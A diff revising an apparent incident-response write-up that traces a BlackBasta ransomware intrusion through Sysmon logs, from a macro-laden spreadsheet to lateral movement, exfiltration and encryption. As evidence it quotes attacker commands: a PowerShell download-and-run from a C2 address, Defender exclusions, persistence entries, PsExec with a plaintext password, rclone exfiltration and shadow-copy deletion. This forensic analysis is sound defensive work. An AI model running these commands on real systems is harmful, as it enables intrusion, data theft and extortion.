@@ -14,7 +14,7 @@ tags:
 
 ### <span class="hl">TL;DR</span>
 
-A finance employee at OrionTech (`FINANCEES\knixon`) downloaded `Financial Records.zip` from attacker-controlled server `54.93.105.22` via Microsoft Edge. The extracted `Financial Records.xlsm` macro executed an encoded PowerShell command that downloaded and ran `F6w1S48.vbs`, which loaded `WindowsUpdaterFX.dll` via `regsvr32.exe`. The DLL added Windows Defender exclusions, established persistence via a registry Run key and a scheduled task, then dropped `Pancake.jpg.exe` as a C2 backdoor connecting back to `54.93.105.22:80`. The attacker enumerated the host and domain, scanned the internal subnet, downloaded PsExec64 via bitsadmin, and laterally moved to a second host using `financees.local\swhite` credentials. From there, `C:\clients` was archived and exfiltrated to MEGA via rclone, the system was configured to boot into Safe Mode, shadow copies were deleted as SYSTEM, and the final **BlackBasta** ransomware payload `6as98v.exe` (61/71 VT detections) was deployed.
+A finance employee (FINANCEES\knixon) downloaded Financial Records.zip from attacker-controlled server 54.93.105.22 via Microsoft Edge. The extracted Financial Records.xlsm macro executed an encoded PowerShell command that downloaded and ran F6w1S48.vbs, which loaded WindowsUpdaterFX.dll via regsvr32.exe. The DLL added Windows Defender exclusions, established persistence via a registry Run key and a scheduled task, then dropped Pancake.jpg.exe as a C2 backdoor connecting back to 54.93.105.22:80. The attacker enumerated the host and domain, scanned the internal subnet, downloaded PsExec64 via bitsadmin, and laterally moved to a second host using financees.local\swhite credentials. From there, C:\clients was archived and exfiltrated to MEGA via rclone, the system was configured to boot into Safe Mode, shadow copies were deleted as SYSTEM, and the final **BlackBasta** ransomware payload 6as98v.exe was deployed.
 
 ### <span style="color:red">Initial Access</span>
 
@@ -22,19 +22,19 @@ I began the investigation in Kibana by filtering for **Sysmon Event ID 15** (Fil
 
 ![Event ID 15 - Financial Records.zip download](15.png)
 
-At **2025-03-21 15:08:22** user `FINANCEES\knixon` downloaded `Financial Records.zip` through `msedge.exe`. The `winlog.event_data.Contents` field showed `ZoneId=3 HostUrl=http://54.93.105.22/Financial%20Records.zip`, confirming the file originated from the internet and identifying the attacker's staging server. The file was saved to `C:\Users\knixon\Downloads\` with SHA256 `1CAAEBE93B73AD6C24193EF2D20548FE2E3F82FCDFF2D0B4A09211B61ADC1F6C`.
+At **2025-03-21 15:08:22** user **FINANCEES\knixon** downloaded `Financial Records.zip` through msedge.exe. The winlog.event_data.Contents field showed **ZoneId=3 HostUrl=http://54.93.105.22/Financial%20Records.zip**, confirming the file originated from the internet and identifying the attacker's staging server. The file was saved to knixon's Downloads folder with SHA256 1CAAEBE93B73AD6C24193EF2D20548FE2E3F82FCDFF2D0B4A09211B61ADC1F6C.
 
 ### <span style="color:red">Execution Chain</span>
 
 #### <span style="color:red">Excel Macro</span>
 
-At **15:09:03** the user extracted and opened `Financial Records.xlsm` (SHA256: `030E7AD9B95892B91A070AC725A77281645F6E75CFC4C88F53DBF448FFFD1E15`). The macro designated itself as a trusted document by writing to the Excel security registry key:
+At **15:09:03** the user extracted and opened `Financial Records.xlsm` (SHA256: 030E7AD9B95892B91A070AC725A77281645F6E75CFC4C88F53DBF448FFFD1E15). The macro designated itself as a trusted document by writing to the Excel security registry key:
 
 ```
 HKU\S-1-5-21-3865674213-28386648-2675066931-1120\SOFTWARE\Microsoft\Office\16.0\Excel\Security\Trusted Documents\TrustRecords\%USERPROFILE%/Downloads/Financial%20Records.xlsm
 ```
 
-This self-trust registration suppresses the macro security warning on subsequent opens. At **15:09:32** the macro spawned `powershell.exe` with `-ExecutionPolicy Bypass -W Hidden -EncodedCommand` - the Hidden window flag and base64-encoded command are standard obfuscation techniques used to hide malicious script content from casual inspection.
+This self-trust registration suppresses the macro security warning on subsequent opens. At **15:09:32** the macro spawned `powershell.exe`.
 
 ![PowerShell encoded command](powershell.png)
 
@@ -45,21 +45,21 @@ Invoke-WebRequest -Uri 'http://54.93.105.22/F6w1S48.vbs' -OutFile "$env:LOCALAPP
 cmd.exe /c "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"
 ```
 
-The macro downloaded a VBScript from the C2 server and immediately executed it in the same command.
+The macro downloaded a VBScript from the C2 server and executed it in the same command.
 
 #### <span style="color:red">VBS and DLL Loading</span>
 
-At **15:15:29** `wscript.exe` executed `F6w1S48.vbs` (PID 8732) from the user's Temp directory.
+At **15:15:29** **wscript.exe** executed `F6w1S48.vbs` from the user's Temp directory.
 
 ![VBS execution](vbs.png)
 
-The script invoked `regsvr32.exe /s C:\Users\knixon\AppData\Local\Temp\WindowsUpdaterFX.dll` (PID 8592). **regsvr32** is a legitimate Windows binary used to register COM DLLs - abusing it to load a malicious DLL is a well-known LOLBin technique (T1218.010) that bypasses application whitelisting since the host process is a signed Microsoft binary. The `/s` flag suppresses the confirmation dialog.
+The script invoked `regsvr32.exe /s C:\Users\knixon\AppData\Local\Temp\WindowsUpdaterFX.dll`. **regsvr32** is a legitimate Windows binary used to register COM DLLs - abusing it to load a malicious DLL is a well-known LOLBin technique (T1218.010) that bypasses application whitelisting since the host process is a signed Microsoft binary.
 
 ![DLL loading via regsvr32](dll.png)
 
 #### <span style="color:red">Persistence and Defense Evasion</span>
 
-Within the same second at **15:15**, `WindowsUpdaterFX.dll` (MD5: `735AB5713DB79516CF350265FA7574E5`) executed a series of commands. It added three Windows Defender exclusion paths to prevent detection of its artifacts:
+Within the same second at **15:15**, `WindowsUpdaterFX.dll` (MD5: 735AB5713DB79516CF350265FA7574E5) executed a series of commands. It added three Windows Defender exclusion paths to prevent detection of its artifacts:
 
 ```powershell
 Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\ssh"
@@ -73,22 +73,21 @@ It then wrote a registry Run key to maintain persistence across user logons:
 HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdater = wscript.exe %LOCALAPPDATA%/Temp/F6w1S48.vbs
 ```
 
-A second persistence mechanism was established via a scheduled task configured to execute as SYSTEM on every logon:
+A second persistence mechanism was established via a scheduled task WiindowsUpdate configured to execute as SYSTEM on every logon:
 
 ```
 schtasks /Create /RU "NT AUTHORITY\SYSTEM" /SC ONLOGON /TN "WiindowsUpdate"
   /TR "C:\Windows\System32\regsvr32.exe /s %%localappdata%%\Temp\WindowsUpdaterFX.dll"
 ```
 
-The task name `WiindowsUpdate` - with a double `i` - is designed to visually blend with legitimate Windows Update tasks.
 
 #### <span style="color:red">Dropper and C2 Backdoor</span>
 
-The DLL created `C:\Users\knixon\AppData\Local\Temp\Pancake.jpg.exe` - the double extension `.jpg.exe` is a masquerading technique exploiting the Windows default of hiding known file extensions, making the binary appear as an image.
+The DLL created `C:\Users\knixon\AppData\Local\Temp\Pancake.jpg.exe` - the **double extension .jpg.exe** is a masquerading technique exploiting the Windows default of hiding known file extensions, making the binary appear as an image.
 
 ![Pancake.jpg.exe FileCreate](c2_file.png)
 
-It then launched the binary via `Start-Process $env:LOCALAPPDATA\Temp\Pancake.jpg.exe`. The process (PID 10292) immediately established an outbound connection from `10.10.11.29` to `54.93.105.22` over **port 80**, confirming its role as a C2 beacon.
+It then launched the binary via `Start-Process $env:LOCALAPPDATA\Temp\Pancake.jpg.exe`. The process (PID 10292) immediately established an outbound connection from 10.10.11.29 to 54.93.105.22 over port 80.
 
 ![C2 network connection](ip.png)
 
@@ -96,39 +95,36 @@ It then launched the binary via `Start-Process $env:LOCALAPPDATA\Temp\Pancake.jp
 
 #### <span style="color:red">Host Enumeration</span>
 
-With the C2 channel active, the attacker issued discovery commands through `Pancake.jpg.exe` (PID 10292) spawning child `cmd.exe` processes at roughly one-minute intervals.
+With the C2 channel active, the attacker issued discovery commands through `Pancake.jpg.exe` spawning child cmd.exe processes at roughly one-minute intervals.
 
 ![Post-exploitation enumeration](enum.png)
 
-At **15:17:41** `whoami` identified the current user context. At **15:18:41** `ipconfig /all` mapped the network configuration. At **15:20:42** `systeminfo` retrieved OS version and patch level. At **15:21:46** `net group "domain admins" /domain` and at **15:22:46** `net localgroup administrators` enumerated privileged accounts - both are standard T1087 (Account Discovery) techniques used to identify high-value lateral movement targets.
-
 #### <span style="color:red">Network Scanning and Tool Staging</span>
 
-At **15:42** the attacker deployed `netscan.exe` to scan the internal subnet `10.10.11.1-10.10.255.255` for live hosts and open services. To enable lateral movement, `bitsadmin` - another LOLBin - was used to download `PsExec64.exe` from a GitHub repository into the knixon Temp folder. **PsExec** is a Sysinternals tool that enables remote process execution on other hosts using valid credentials.
+At **15:42** the attacker deployed `netscan.exe` to scan the internal subnet 10.10.11.1-10.10.255.255 for live hosts and open services. To enable lateral movement, *bitsadmin* - another LOLBin - was used to download `PsExec64.exe` from a GitHub repository into the knixon Temp folder. **PsExec** is a Sysinternals tool that enables remote process execution on other hosts using valid credentials.
 
 ![Network scan and PsExec download](lat.png)
 
 ### <span style="color:red">Lateral Movement</span>
 
-With `PsExec64.exe` staged, the attacker used compromised credentials `financees.local\swhite` with password `b<ZITx4h1` to authenticate to `10.10.11.170`. Initial validation commands `whoami` and `hostname` confirmed remote execution was working. The attacker then propagated the implant using:
-
+With `PsExec64.exe` staged, the attacker used compromised credentials `financees.local\swhite` with password `b<ZITx4h1` to authenticate to 10.10.11.170. Initial validation commands whoami and hostname confirmed remote execution was working. The attacker then propagated the implant using:
 ```
 PsExec64.exe \\financees.local -accepteula -s -c -f Pancake.jpg.exe
 ```
 
-The `-c -f` flags copy and force-overwrite the executable to the remote host, and `-s` runs it as SYSTEM, giving the attacker the highest privilege level on the domain controller.
+The `-c -f` flags copy and force-overwrite the executable to the remote host, and `-s` runs it as SYSTEM
 
 ![PsExec lateral movement](swhite.png)
 
 ### <span style="color:red">Collection and Exfiltration</span>
 
-Operating in the context of `swhite`, the attacker collected sensitive data by compressing `C:\clients` into `data.zip` via `Compress-Archive`. The archive was then exfiltrated to cloud storage using `rclone copy data.zip mega:data` - **rclone** is a legitimate cloud sync utility frequently abused for data exfiltration (T1567.002) because traffic to MEGA blends with normal cloud storage activity and is rarely blocked.
+Operating in the context of swhite, the attacker collected sensitive data by compressing `C:\clients` into `data.zip`. The archive was then exfiltrated to cloud storage using `rclone copy data.zip mega:data` - **rclone** is a cloud sync utility frequently abused for data exfiltration (T1567.002) because traffic to MEGA blends with normal cloud storage activity and is rarely blocked.
 
 ![Collection, exfiltration and payload staging](ransom_downalod.png)
 
 ### <span style="color:red">Pre-Ransomware Staging</span>
 
-Before deploying the encryptor, the attacker executed `bcdedit.exe /set safeboot network` to configure the system to reboot into Safe Mode with networking. This technique disables most security software and EDR agents that do not load in Safe Mode, ensuring the ransomware can encrypt files without interference. At **16:47:19** `curl` downloaded the final payload `6as98v.exe` from `http://54.93.105.22/6as98v.exe` into `C:\Users\swhite\AppData\Local\Temp\`.
+Before deploying the encryptor, the attacker executed `bcdedit.exe /set safeboot network` to configure the system to reboot into Safe Mode with networking. This technique disables most security software and EDR agents that do not load in Safe Mode, ensuring the ransomware can encrypt files without interference. At **16:47:19** curl downloaded the final payload `6as98v.exe` from `http://54.93.105.22/6as98v.exe` into `C:\Users\swhite\AppData\Local\Temp\`.
 
 ### <span style="color:red">Ransomware Execution and Cleanup</span>
 
@@ -140,7 +136,7 @@ Shadow copies were deleted as `NT AUTHORITY\SYSTEM` using `vssadmin.exe delete s
 
 #### <span style="color:red">Ransomware Deployment</span>
 
-At **16:49:19** `6as98v.exe` (PID 5792, MD5: `998022B70D83C6DE68E5BDF94E0F8D71`) was executed. VirusTotal confirmed **61/71** vendors flagged this sample as **ransomware.blackbasta/basta** - BlackBasta is a ransomware-as-a-service operation known for double extortion attacks targeting enterprise environments.
+At **16:49:19** `6as98v.exe` (PID 5792, MD5: 998022B70D83C6DE68E5BDF94E0F8D71) was executed. VirusTotal confirmed **61/71** vendors flagged this sample as **ransomware.blackbasta/basta** - BlackBasta is a ransomware-as-a-service operation known for double extortion attacks targeting enterprise environments.
 
 ![VirusTotal - BlackBasta confirmation](virustotal.png)
 
